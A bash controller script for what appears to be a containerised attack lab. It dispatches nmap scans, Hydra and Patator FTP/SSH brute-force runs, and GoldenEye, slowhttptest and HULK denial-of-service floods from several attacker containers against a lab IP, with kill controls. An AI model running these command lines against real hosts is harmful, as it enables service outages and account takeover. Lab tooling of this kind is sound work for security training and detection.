#!/bin/bash

# Controller script: run from HOST (WSL / Git Bash)
# It dispatches commands into attacker containers via docker exec.
# Start attackers first, e.g.:
#   docker-compose up -d --scale attacker=3

TARGET="10.9.0.5"
WORDLIST_PASS="/volumes/xato_passwords_100k.txt"
WORDLIST_USER="/volumes/common_usernames.txt"

# Colours
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# ALL_MODE = "run all attacks sequentially with 10s timeout each"
ALL_MODE=false

# File to track launched attacks (on the host)
ATTACKS_FILE=".attacks_state"
ATTACK_SEQ=0

# Initialise attack sequence from file (if it exists)
if [ -f "$ATTACKS_FILE" ] && [ -s "$ATTACKS_FILE" ]; then
    last_id=$(tail -n 1 "$ATTACKS_FILE" 2>/dev/null | awk '{print $1}')
    if [[ "$last_id" =~ ^[0-9]+$ ]]; then
        ATTACK_SEQ="$last_id"
    fi
fi
touch "$ATTACKS_FILE"

# Handle Ctrl+C
trap 'handle_interrupt' INT

handle_interrupt() {
    echo -e "\n${YELLOW}[!] Attack interrupted by user${NC}"
    if [ "$ALL_MODE" = true ]; then
        echo -e "${YELLOW}[?] Continue to next attack? (y/n)${NC}"
        read -r continue_choice
        if [[ ! "$continue_choice" =~ ^[Yy]$ ]]; then
            echo -e "${RED}Aborting all attacks...${NC}"
            ALL_MODE=false
            return 1
        fi
    fi
    return 0
}

# -------------------------------------------------------------------
# Helper functions: list/select attacker containers & run commands
# -------------------------------------------------------------------

# List attacker containers (by docker-compose service name "attacker")
list_attackers() {
    docker ps --filter "label=com.docker.compose.service=attacker" --format '{{.ID}}'
}

# Internal: register and start attack on ONE container (for tracking)
_start_attack_on_container() {
    local container="$1"
    shift
    local cmd="$*"

    ATTACK_SEQ=$((ATTACK_SEQ + 1))
    local id="$ATTACK_SEQ"

    # Log on host: id container cmd...
    echo "$id $container $cmd" >> "$ATTACKS_FILE"

    # Start in container: background command, store PID and output
    docker exec -d "$container" bash -lc "$cmd > /tmp/attack_${id}.log 2>&1 & echo \$! > /tmp/attack_${id}.pid"

    echo -e "  ${BLUE}→ Attack ID ${YELLOW}[$id]${BLUE} started in container${NC} $container"
}

# Run a command on attacker containers
# Usage: run_cmd_on_attackers <limit_or_empty> <command...>
#   limit_or_empty:
#     ""   -> use all attackers
#     "3"  -> use first 3 attackers
#     "all"-> use all attackers
run_cmd_on_attackers() {
    local attacker_limit="$1"
    shift
    local cmd="$*"

    local containers=()
    local all_containers=()
    local total
    local limit

    # Read all attacker container IDs into array
    while IFS= read -r line; do
        [ -n "$line" ] && all_containers+=("$line")
    done < <(list_attackers)

    total=${#all_containers[@]}

    if [ "$total" -eq 0 ]; then
        echo -e "${RED}[!] No attacker containers found.${NC}"
        echo -e "${YELLOW}    Make sure you've run: docker-compose up -d --scale attacker=3${NC}"
        ALL_MODE=false
        return 1
    fi

    # Decide how many attackers to use for THIS command
    if [ -z "$attacker_limit" ] || [ "$attacker_limit" = "all" ]; then
        containers=("${all_containers[@]}")
        limit=$total
    else
        # Validate numeric limit
        if ! [[ "$attacker_limit" =~ ^[0-9]+$ ]] || [ "$attacker_limit" -lt 1 ]; then
            echo -e "${YELLOW}[!] Invalid attacker count '$attacker_limit', using ALL attackers instead.${NC}"
            containers=("${all_containers[@]}")
            limit=$total
        else
            limit="$attacker_limit"
            if [ "$limit" -gt "$total" ]; then
                echo -e "${YELLOW}[!] Requested $limit attackers, but only $total available. Using all.${NC}"
                limit=$total
            fi
            local i
            for ((i=0; i<limit; i++)); do
                containers+=("${all_containers[$i]}")
            done
        fi
    fi

    echo -e "${GREEN}[*] Dispatching command to ${limit} attacker(s):${NC} ${containers[*]}"
    for c in "${containers[@]}"; do
        _start_attack_on_container "$c" "$cmd"
    done

    echo -e "${GREEN}[✓] Command dispatched to selected attackers${NC}"
}

# -------------------------------------------------------------------
# Attack tracking: list & kill
# -------------------------------------------------------------------

list_running_attacks() {
    echo -e "${BLUE}--- Running attacks ---${NC}"
    if [ ! -s "$ATTACKS_FILE" ]; then
        echo -e "${YELLOW}[i] No attacks have been recorded yet.${NC}"
        return
    fi

    local any_running=false

    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local id container
        id=$(echo "$line" | awk '{print $1}')
        container=$(echo "$line" | awk '{print $2}')
        local cmd=${line#"$id $container "}

        # Check if container still exists
        if ! docker ps --format '{{.ID}}' | grep -q "^$container$"; then
            continue
        fi

        # Check if the process is still running in the container
        local status
        status=$(docker exec "$container" bash -lc "[ -f /tmp/attack_${id}.pid ] && ps -p \$(cat /tmp/attack_${id}.pid) >/dev/null 2>&1 && echo running || echo stopped" 2>/dev/null)

        if [ "$status" = "running" ]; then
            any_running=true
            echo -e "[${YELLOW}$id${NC}] container=${BLUE}$container${NC}"
            echo -e "     cmd=${GREEN}$cmd${NC}"
        fi
    done < "$ATTACKS_FILE"

    if [ "$any_running" = false ]; then
        echo -e "${YELLOW}[i] No recorded attacks are currently running.${NC}"
    fi
}

kill_attack_by_id() {
    echo -e "${BLUE}--- Kill attack by ID ---${NC}"
    read -rp "Enter attack ID to kill: " id
    if ! [[ "$id" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Invalid attack ID${NC}"
        return
    fi

    local line
    line=$(grep -E "^${id} " "$ATTACKS_FILE" | head -n1) || {
        echo -e "${RED}[!] No attack with ID ${id} found in log.${NC}"
        return
    }

    local container cmd
    container=$(echo "$line" | awk '{print $2}')
    cmd=${line#"$id $container "}

    if ! docker ps --format '{{.ID}}' | grep -q "^$container$"; then
        echo -e "${YELLOW}[!] Container $container is no longer running.${NC}"
    else
        echo -e "${GREEN}[*] Killing attack [${id}] in container $container${NC}"
        docker exec "$container" bash -lc "if [ -f /tmp/attack_${id}.pid ]; then kill \$(cat /tmp/attack_${id}.pid) 2>/dev/null || true; rm -f /tmp/attack_${id}.pid; fi" \
            && echo -e "${GREEN}[✓] Kill signal sent for attack [${id}]${NC}"
    fi

    # Remove from log file
    grep -Ev "^${id} " "$ATTACKS_FILE" > "${ATTACKS_FILE}.tmp" && mv "${ATTACKS_FILE}.tmp" "$ATTACKS_FILE"

    echo ""
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read
}

kill_all_attacks() {
    echo -e "${BLUE}--- Kill ALL running attacks (panic button) ---${NC}"

    # If no attacks file at all, we still run the pattern sweep below
    if [ ! -f "$ATTACKS_FILE" ]; then
        touch "$ATTACKS_FILE"
    fi

    # 1) Kill attacks we have explicit PIDs for
    local any_tracked=false

    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local id container
        id=$(echo "$line" | awk '{print $1}')
        container=$(echo "$line" | awk '{print $2}')

        # Skip if container is gone
        if ! docker ps --format '{{.ID}}' | grep -q "^$container$"; then
            continue
        fi

        any_tracked=true
        echo -e "${GREEN}[*] Killing tracked attack [${id}] in container $container${NC}"
        docker exec "$container" bash -lc "if [ -f /tmp/attack_${id}.pid ]; then kill \$(cat /tmp/attack_${id}.pid) 2>/dev/null || true; rm -f /tmp/attack_${id}.pid; fi" \
            && echo -e "${GREEN}[✓] Kill signal sent for tracked attack [${id}]${NC}"
    done < "$ATTACKS_FILE"

    if [ "$any_tracked" = false ]; then
        echo -e "${YELLOW}[i] No tracked attacks found by ID. Proceeding to pattern-based kill.${NC}"
    fi

    # 2) Extra safety: pattern-based sweep inside EACH attacker container
    #    This kills any leftover processes from tools we might use, even if not tracked.
    echo -e "${BLUE}[*] Running pattern-based cleanup in all attacker containers...${NC}"

    while IFS= read -r container; do
        [ -z "$container" ] && continue

        echo -e "   ${BLUE}- Cleaning container${NC} $container"
        docker exec "$container" bash -lc "
            # GoldenEye (python-based)
            pkill -f '/volumes/GoldenEye/goldeneye.py' 2>/dev/null || true
            # slowhttptest / slowloris-style
            pkill -f 'slowhttptest -u http://$TARGET:80' 2>/dev/null || true
            # HULK
            pkill -f './volumes/hulk -site http://$TARGET:80' 2>/dev/null || true
            # nmap scans from this script
            pkill -f 'nmap -A -p-' 2>/dev/null || true
            # hydra brute force
            pkill -f 'hydra -P $WORDLIST_PASS -L $WORDLIST_USER' 2>/dev/null || true
            # patator ftp / ssh (wip)
            pkill -f 'patator ftp_login' 2>/dev/null || true
            pkill -f 'patator ssh_login' 2>/dev/null || true
            # test sleep workload (if you use run_test_sleep)
            pkill -f 'sleep 600' 2>/dev/null || true
        " || true

    done < <(list_attackers)

    # 3) Clear the log file after mass-kill to avoid stale entries
    : > "$ATTACKS_FILE"
    echo -e "${GREEN}[✓] Attack log cleared.${NC}"

    echo ""
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read
}

# -------------------------------------------------------------------
# UI + Menu
# -------------------------------------------------------------------

echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}   Attack Demonstration Menu${NC}"
echo -e "${GREEN}           (Controller)${NC}"
echo -e "${GREEN}=====================================${NC}"
echo -e "Target: ${YELLOW}$TARGET${NC}"
echo ""
echo -e "${BLUE}💡 This script runs commands via docker exec into attacker containers.${NC}"
echo -e "${BLUE}💡 Usage examples:${NC}"
echo -e "   ${YELLOW}9${NC}       -> dos-http on ALL attackers"
echo -e "   ${YELLOW}11 1${NC}    -> dos-hulk on 1 attacker"
echo -e "   ${YELLOW}2 2${NC}     -> portscan-syn on 2 attackers"
echo -e "   ${YELLOW}0${NC}       -> list running attacks"
echo -e "   ${YELLOW}15${NC}      -> kill attack by ID"
echo -e "   ${YELLOW}16${NC}      -> kill ALL running attacks"
echo ""

show_menu() {
    local total_attackers
    total_attackers=$(list_attackers | wc -l | tr -d ' ')
    echo -e "${BLUE}Attackers detected:${NC} ${YELLOW}${total_attackers}${NC}"
    echo ""
    echo -e "${BLUE}Menu:${NC}"
    echo ""
    echo "  0) list-attacks        - List currently running attacks"
    echo ""
    echo "  1) portscan-basic      - Basic nmap scan"
    echo "  2) portscan-syn        - SYN scan"
    echo "  3) portscan-full       - Full scan with scripts"
    echo "  4) portscan-stealth    - Stealth scan (ignore ping)"
    echo ""
    echo "  5) ftp-hydra           - FTP brute force using Hydra"
    echo "  6) ftp-patator (wip)   - FTP brute force using Patator"
    echo ""
    echo "  7) ssh-hydra           - SSH brute force using Hydra"
    echo "  8) ssh-patator (wip)   - SSH brute force using Patator"
    echo ""
    echo "  9) dos-http            - HTTP DOS attack (GoldenEye)"
    echo " 10) dos-slowloris       - HTTP DOS attack (slowhttptest)"
    echo " 11) dos-hulk            - HTTP DOS attack (HULK)"
    echo ""
    echo " 12) all                 - Run ALL attacks with 1 attacker,"
    echo "                            then DOS attacks again with 3 attackers"
    echo ""
    echo " 15) kill-attack         - Kill a running attack by ID"
    echo " 16) kill-all-attacks    - Kill ALL running attacks"
    echo ""
    echo "  q) quit                - Exit menu"
    echo ""
    echo -e "${YELLOW}Enter: <option> [num_attackers]${NC}"
}

# -------------------------------------------------------------------
# Attack functions (each takes 1st arg = attacker_limit)
# -------------------------------------------------------------------

run_portscan_basic() {
    local limit="$1"
    echo -e "${GREEN}[*] Running Basic Port Scan...${NC}"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 nmap -A -p- $TARGET"
    else
        cmd="nmap -A -p- $TARGET"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Basic scan dispatched${NC}"
}

run_portscan_syn() {
    local limit="$1"
    echo -e "${GREEN}[*] Running SYN Scan...${NC}"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 nmap -A -p- -sS $TARGET"
    else
        cmd="nmap -A -p- -sS $TARGET"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] SYN scan dispatched${NC}"
}

run_portscan_full() {
    local limit="$1"
    echo -e "${GREEN}[*] Running Full Scan with scripts and version detection...${NC}"
    local base_cmd="nmap -A -p- -sC -sV $TARGET --min-rate 1000"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Full scan dispatched${NC}"
}

run_portscan_stealth() {
    local limit="$1"
    echo -e "${GREEN}[*] Running Stealth Scan (ignoring ping)...${NC}"
    local base_cmd="nmap -A -p- -sC -sV $TARGET --min-rate 1000 -Pn"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Stealth scan dispatched${NC}"
}

run_ftp_hydra() {
    local limit="$1"
    echo -e "${GREEN}[*] Running FTP Brute Force with Hydra...${NC}"
    local base_cmd="hydra -P $WORDLIST_PASS -L $WORDLIST_USER ftp://$TARGET"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Hydra FTP brute force dispatched${NC}"
}

run_ftp_patator() {
    local limit="$1"
    echo -e "${GREEN}[*] Running FTP Brute Force with Patator (wip)...${NC}"
    local base_cmd="patator ftp_login host=$TARGET user=FILE1 password=FILE0 0=$WORDLIST_PASS 1=$WORDLIST_USER -x ignore:mesg=\"Authentication failed\""
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Patator FTP brute force dispatched${NC}"
}

run_ssh_hydra() {
    local limit="$1"
    echo -e "${GREEN}[*] Running SSH Brute Force with Hydra...${NC}"
    local base_cmd="hydra -P $WORDLIST_PASS -L $WORDLIST_USER ssh://$TARGET"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Hydra SSH brute force dispatched${NC}"
}

run_ssh_patator() {
    local limit="$1"
    echo -e "${GREEN}[*] Running SSH Brute Force with Patator (wip)...${NC}"
    local base_cmd="patator ssh_login host=$TARGET user=FILE1 password=FILE0 0=$WORDLIST_PASS 1=$WORDLIST_USER -x ignore:mesg=\"Authentication failed\""
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Patator SSH brute force dispatched${NC}"
}

run_dos_http() {
    local limit="$1"
    echo -e "${GREEN}[*] Running HTTP DOS Attack (GoldenEye)...${NC}"
    local base_cmd="python3 /volumes/GoldenEye/goldeneye.py http://$TARGET:80"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] HTTP DOS attack (GoldenEye) dispatched${NC}"
}

run_dos_slowloris() {
    local limit="$1"
    echo -e "${GREEN}[*] Running HTTP DOS Attack (slowhttptest / Slowloris-style)...${NC}"
    local base_cmd="slowhttptest -u http://$TARGET:80"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] HTTP DOS attack (slowhttptest) dispatched${NC}"
}

run_dos_hulk() {
    local limit="$1"
    echo -e "${GREEN}[*] Running HTTP DOS Attack (HULK)...${NC}"
    local base_cmd="./volumes/hulk/hulk -site http://$TARGET:80"
    local cmd
    if [ "$ALL_MODE" = true ]; then
        cmd="timeout 10 $base_cmd"
    else
        cmd="$base_cmd"
    fi
    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] HTTP DOS attack (HULK) dispatched${NC}"
}

run_test_sleep() {
    local limit="$1"
    echo -e "${GREEN}[*] Running test 'sleep 600' process...${NC}"

    # Simple long-running command, minimal CPU
    local base_cmd="sleep 600"
    local cmd="$base_cmd"

    run_cmd_on_attackers "$limit" "$cmd" || return 1
    echo -e "${GREEN}[✓] Test sleep dispatched${NC}"
    echo -e "${YELLOW}Tip:${NC} You can now docker exec into the attacker container and run 'ps aux | grep sleep' to see it."
}

# -------------------------------------------------------------------
# Run ALL attacks sequentially
#   - All (non-wip) attacks once with 1 attacker
#   - Then DOS attacks again with 3 attackers (DDoS sim)
#   - Patator commands are commented out in this sequence
# -------------------------------------------------------------------

run_all_attacks() {
    local old_all_mode="$ALL_MODE"
    ALL_MODE=true

    echo -e "${YELLOW}======================================${NC}"
    echo -e "${YELLOW}Running ALL attacks with 1 attacker${NC}"
    echo -e "${YELLOW}Then repeating DOS attacks with 3 attackers (DDoS simulation)${NC}"
    echo -e "${YELLOW}Each step limited to ~10 seconds in containers${NC}"
    echo -e "${YELLOW}Press Ctrl+C to skip current attack${NC}"
    echo -e "${YELLOW}======================================${NC}"
    echo ""

    # Phase 1: ALL commands with 1 attacker
    echo -e "${BLUE}[1/11] Port Scanning (Basic)${NC}"
    run_portscan_basic 1 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[2/11] Port Scanning (SYN)${NC}"
    run_portscan_syn 1 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[3/11] Port Scanning (Full)${NC}"
    run_portscan_full 1 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[4/11] Port Scanning (Stealth)${NC}"
    run_portscan_stealth 1 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[5/11] FTP Brute Force (Hydra)${NC}"
    run_ftp_hydra 1 || { ALL_MODE=false; return; }
    sleep 2

    # echo -e "${BLUE}[6/11] FTP Brute Force (Patator) (wip)${NC}"
    # run_ftp_patator 1 || { ALL_MODE=false; return; }
    # sleep 2

    echo -e "${BLUE}[7/11] SSH Brute Force (Hydra)${NC}"
    run_ssh_hydra 1 || { ALL_MODE=false; return; }
    sleep 2

    # echo -e "${BLUE}[8/11] SSH Brute Force (Patator) (wip)${NC}"
    # run_ssh_patator 1 || { ALL_MODE=false; return; }
    # sleep 2

    echo -e "${BLUE}[9/11] HTTP DOS Attack (GoldenEye)${NC}"
    run_dos_http 1 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[10/11] HTTP DOS Attack (slowhttptest / Slowloris)${NC}"
    run_dos_slowloris 1 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[11/11] HTTP DOS Attack (HULK)${NC}"
    run_dos_hulk 1 || { ALL_MODE=false; return; }
    sleep 2

    # Phase 2: DOS attacks again with 3 attackers
    echo ""
    echo -e "${YELLOW}======================================${NC}"
    echo -e "${YELLOW}DDoS Simulation: DOS attacks with 3 attackers${NC}"
    echo -e "${YELLOW}======================================${NC}"
    echo ""

    echo -e "${BLUE}[*] DDoS Phase: GoldenEye (3 attackers)${NC}"
    run_dos_http 3 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[*] DDoS Phase: slowhttptest / Slowloris (3 attackers)${NC}"
    run_dos_slowloris 3 || { ALL_MODE=false; return; }
    sleep 2

    echo -e "${BLUE}[*] DDoS Phase: HULK (3 attackers)${NC}"
    run_dos_hulk 3 || { ALL_MODE=false; return; }
    sleep 2

    ALL_MODE="$old_all_mode"

    echo ""
    echo -e "${GREEN}======================================${NC}"
    echo -e "${GREEN}All attacks dispatched!${NC}"
    echo -e "${GREEN}======================================${NC}"
}

# -------------------------------------------------------------------
# Main loop
# -------------------------------------------------------------------

while true; do
    show_menu
    # Read: first token = option, second token = num_attackers (optional)
    read -r choice attacker_count
    
    case $choice in
        0)  list_running_attacks ;;
        1)  run_portscan_basic   "$attacker_count" ;;
        2)  run_portscan_syn     "$attacker_count" ;;
        3)  run_portscan_full    "$attacker_count" ;;
        4)  run_portscan_stealth "$attacker_count" ;;
        5)  run_ftp_hydra        "$attacker_count" ;;
        6)  run_ftp_patator      "$attacker_count" ;;
        7)  run_ssh_hydra        "$attacker_count" ;;
        8)  run_ssh_patator      "$attacker_count" ;;
        9)  run_dos_http         "$attacker_count" ;;
        10) run_dos_slowloris    "$attacker_count" ;;
        11) run_dos_hulk         "$attacker_count" ;;
        12) run_all_attacks ;;
        13) run_test_sleep       "$attacker_count" ;;
        15) kill_attack_by_id ;;
        16) kill_all_attacks ;;
        q|Q) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
        *)  echo -e "${RED}Invalid option. Please try again.${NC}" ;;
    esac

    echo ""
done
